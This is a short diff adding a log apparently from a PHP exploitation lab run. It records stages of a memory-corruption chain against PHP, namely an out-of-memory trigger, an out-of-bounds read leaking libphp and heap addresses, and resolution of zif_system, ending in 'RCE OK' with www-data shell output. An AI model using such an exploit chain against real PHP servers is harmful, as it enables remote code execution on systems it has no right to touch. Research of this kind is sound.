@@ -1,0 +1,7 @@
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0x7f9505e85b60 -> libphp=0x7f9505827000
+      chunk buckets: [('0x7f9503400000', 7495), ('0x7f9505e00000', 1095), ('0x7f9503c00000', 87), ('0x7f9503200000', 79)]
+[try 1] A2 + B2: main=0x7f9503c00000 S=0x7f9503cf8398 zif_system=0x7f9505c8c370
+[4/4] RCE OK; proof /home/ravhi/randoman/deepjb/php2shell-lab/exploits/9bie-latest/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
